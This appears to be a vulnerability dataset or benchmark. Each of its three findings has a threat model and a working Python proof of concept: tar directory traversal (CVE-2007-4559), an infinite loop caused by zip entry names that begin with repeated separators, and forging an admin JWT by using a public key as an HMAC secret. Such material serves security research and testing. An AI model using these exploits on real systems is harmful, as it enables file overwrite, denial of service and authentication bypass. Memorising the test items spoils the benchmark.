src/data-isolation-and-lifecycle.title: Directory traversal via tarfile.extractall (CVE-2007-4559)

threat_model.attacker: attacker who supplies the tar archive
threat_model.boundary: archive member path escapes the extraction directory

src/data-isolation-and-lifecycle.description: extract() calls tarfile.extractall without validating member names, so '../' members write outside dest.

poc.content:
import io, os, tarfile, tempfile, importlib.util
s = importlib.util.spec_from_file_location('extract', 'src/extract.py')
m = importlib.util.module_from_spec(s); s.loader.exec_module(m)
work = tempfile.mkdtemp(); dest = os.path.join(work, 'out'); os.makedirs(dest)
tarp = os.path.join(work, 'mal.tar')
with tarfile.open(tarp, 'w') as tf:
    data = b'owned'
    info = tarfile.TarInfo('../pwned.txt'); info.size = len(data)
    tf.addfile(info, io.BytesIO(data))
try:
    m.extract(tarp, dest)
except Exception:
    pass
assert os.path.exists(os.path.join(work, 'pwned.txt')), 'no escape'
print('TRAVERSAL_OK')

ziptree/resource-exhaustion-and-availabi.title: Unbounded loop on zip entry names with repeated leading separators

threat_model.attacker: attacker who supplies the zip archive
threat_model.boundary: a crafted entry name makes path enumeration loop forever

ziptree/resource-exhaustion-and-availabi.description: _ancestry() stops only when the path equals a single separator, so a name beginning with repeated separators never reduces and the loop never ends, hanging any listing of the archive.

poc.content:
import sys, io, zipfile, threading, os
sys.path.insert(0, '.')
import ziptree
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr('//a/b', 'x')
buf.seek(0)
def go():
    list(ziptree.Path(buf).iterdir())
t = threading.Thread(target=go, daemon=True)
t.start(); t.join(3.0)
if t.is_alive():
    print('DOS_HANG', flush=True); os._exit(0)
print('completed'); sys.exit(1)

tokenlib/web-protocol-and-auth.title: Asymmetric public key accepted as an HMAC secret

threat_model.attacker: attacker who knows the service's public verification key
threat_model.boundary: a public key is accepted as a symmetric HMAC secret, enabling token forgery

tokenlib/web-protocol-and-auth.description: HMACAlgorithm.prepare_key rejects only a fixed list of key markers, so a public key in another format (e.g. an ssh-ed25519 key) is accepted as the HMAC secret; anyone holding the public key can then forge HS256 tokens.

poc.content:
import sys
sys.path.insert(0, '.')
import tokenlib as jwt
pub = ('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGb9ECWmEzf6FQbrBZ9w7lshQhqowgb'
       'qHtjdQyfp2VTO user@host')
try:
    token = jwt.encode({'admin': True}, pub, algorithm='HS256')
except Exception as exc:
    print('rejected:', type(exc).__name__); sys.exit(1)
data = jwt.decode(token, pub, algorithms=['HS256'])
assert data.get('admin') is True, 'verify failed'
print('KEYCONF_OK')
